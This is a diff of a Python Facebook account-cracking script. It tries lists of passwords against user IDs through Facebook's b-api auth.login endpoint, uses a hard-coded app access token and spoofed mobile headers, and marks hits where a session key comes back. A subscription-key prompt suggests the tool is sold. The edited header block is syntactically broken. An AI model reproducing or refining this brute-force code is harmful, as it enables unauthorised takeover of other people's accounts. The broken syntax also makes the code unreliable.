@@ -1264,16 +1264,25 @@ class Main:
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
-			}
+			headers = 
+   {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+	"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+	"x-fb-net-hni": str(random.randint(20000, 40000)), 
+    'authority': 'mbasic.facebook.com',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro)
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-user': '?1',
+    'sec-fetch-dest': 'document',
+    'referer': 'https://www.google.com/',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[ R4BBI-OK ] %s | %s\033[0;97m         "%(uid, pw))
@@ -1316,7 +1325,7 @@ def Subscraption():
 		print("")
 		print(" Copy And Send Key To Admin")
 		print ("")
-		print (" Your Key : "+ak+ahsan+key1)
+		print (" Your Key : "+ak+devid+key1)
 		print ("")
 		name = input(" Your Name : ")
 		print ("")
